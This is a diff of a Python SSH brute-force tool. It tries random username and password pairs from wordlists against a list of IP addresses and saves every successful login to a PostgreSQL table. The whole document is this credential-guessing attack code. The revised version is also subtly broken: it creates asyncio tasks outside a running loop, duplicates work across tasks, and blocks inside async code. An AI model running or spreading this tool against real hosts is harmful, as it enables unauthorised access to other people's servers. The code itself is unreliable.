@@ -5,7 +5,7 @@ import psycopg2
 import paramiko
 import traceback
 import time
-import os 
+import os
 import json
 import random
 from dotenv import load_dotenv
@@ -27,87 +27,83 @@ conn = psycopg2.connect(
 )
 
 MAX_RETRIES = 3
-THREAD_COUNT = 10
 
-def ssh_login(username_file, password_file):
+async def ssh_login(username_file, password_file, ip_address):
     with open(username_file, 'r', encoding='utf-8', errors='ignore') as file:
         usernames = file.read().splitlines()
 
     with open(password_file, 'r', encoding='utf-8', errors='ignore') as file:
         passwords = file.read().splitlines()
 
-    while True:
+    for i in range(1000):
+        username = random.choice(usernames)
+        password = random.choice(passwords)
         retries = 0
-        cur = conn.cursor()
-        cur.execute("SELECT hostname, ip_address FROM hosts WHERE ip_address IS NOT NULL ORDER BY RANDOM()")
-        rows = cur.fetchall()
-        if len(rows) == 0:
-            break
 
-        hostname, ip_address = rows[0]
+        while retries < MAX_RETRIES:
+            try:
+                client = paramiko.SSHClient()
+                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
-        for i in range(1000):
-            username = random.choice(usernames)
-            password = random.choice(passwords)
-            while retries < MAX_RETRIES:
+                print(f"{GREEN}Trying {RESET}{username}/{password} {GREEN}as credentials on {RESET}{ip_address}")
+
                 try:
-                    client = paramiko.SSHClient()
-                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-
-                    print(f"{GREEN}Trying {RESET}{username}/{password} {GREEN}as credentials on {RESET}{ip_address}")
-
-                    try:
-                        client.connect(str(ip_address), port=22, username=username, password=password, timeout=15)
-                        print(f"{GREEN}Successful login on {RESET}{ip_address}{GREEN} with credentials: {RESET}{username}/{password}")
-                    except paramiko.AuthenticationException:
-                        # Incorrect credentials, continue to the next one
-                        break
-                    except paramiko.SSHException:
-                        print(f"{RED}Failed to connect to {RESET}{ip_address}")
-                        break
-                    except socket.timeout:
-                        print(f"{RED}Connection timed out for {RESET}{ip_address}")
-                        break
-                    except paramiko.ssh_exception.NoValidConnectionsError as e:
-                        print(f"{RED}Unable to connect to port 22 on {RESET}{ip_address}")
-                        print(f"{RED}Error: {RESET}{str(e)}")
-                        break
-                    except (ConnectionResetError, paramiko.ssh_exception.SSHException) as e:
-                        print(f"{RED}Connection reset. Retrying...")
-                        retries += 1
-                        time.sleep(1)  # Wait for 1 second before retrying
-                        continue
-                    finally:
-                        client.close()
-
-                    cur.execute("INSERT INTO ssh_logins (hostname, ip_address, username, password) VALUES (%s, %s, %s, %s)", (hostname, ip_address, username, password))
-                    conn.commit()
+                    client.connect(str(ip_address), port=22, username=username, password=password, timeout=15)
+                    print(f"{GREEN}Successful login on {RESET}{ip_address}{GREEN} with credentials: {RESET}{username}/{password}")
+                except paramiko.AuthenticationException:
+                    # Incorrect credentials, continue to the next one
                     break
-
-                except Exception as e:
-                    print(f"{RED}Error occurred: {RESET}{str(e)}")
-                    traceback.print_exc()
+                except paramiko.SSHException:
+                    print(f"{RED}Failed to connect to {RESET}{ip_address}")
                     break
+                except socket.timeout:
+                    print(f"{RED}Connection timed out for {RESET}{ip_address}")
+                    break
+                except paramiko.ssh_exception.NoValidConnectionsError as e:
+                    print(f"{RED}Unable to connect to port 22 on {RESET}{ip_address}")
+                    print(f"{RED}Error: {RESET}{str(e)}")
+                    break
+                except (ConnectionResetError, paramiko.ssh_exception.SSHException) as e:
+                    print(f"{RED}Connection reset. Retrying...")
+                    retries += 1
+                    time.sleep(1)  # Wait for 1 second before retrying
+                    continue
+                finally:
+                    client.close()
 
-            if retries >= MAX_RETRIES:
-                print(f"{YELLOW}Maximum retries reached. Moving to the next host.")
+                cur = conn.cursor()
+                cur.execute("INSERT INTO ssh_logins (ip_address, username, password) VALUES (%s, %s, %s)", (ip_address, username, password))
+                conn.commit()
                 break
 
-async def run_ssh_login(username_file, password_file):
-    await asyncio.to_thread(ssh_login, username_file, password_file)
+            except Exception as e:
+                print(f"{RED}Error occurred: {RESET}{str(e)}")
+                traceback.print_exc()
+                break
+
+        if retries >= MAX_RETRIES:
+            print(f"{YELLOW}Maximum retries reached. Moving to the next IP address.")
+            break
+
+async def run_ssh_login(ip_addresses):
+    for ip_address in ip_addresses:
+        await ssh_login('usernames.txt', 'passwords.txt', ip_address)
 
 def main():
-    threads = []
+    ip_addresses = []  # Fill this list with the IP addresses you want to test
 
-    for _ in range(THREAD_COUNT):
-        task = asyncio.create_task(run_ssh_login('usernames.txt', 'passwords.txt'))
+    threads = []
+    for _ in range(len(ip_addresses)):
+        task = asyncio.create_task(run_ssh_login(ip_addresses))
         threads.append(task)
 
-    loop = asyncio.get_event_loop()
     try:
-        loop.run_until_complete(asyncio.wait(threads))
-    finally:
-        loop.close()
+        asyncio.run(asyncio.wait(threads))
+    except KeyboardInterrupt:
+        print("Keyboard interrupt detected. Stopping...")
+        for task in threads:
+            task.cancel()
+        asyncio.run(asyncio.wait(threads, return_when=asyncio.ALL_COMPLETED))
 
 if __name__ == '__main__':
     main()
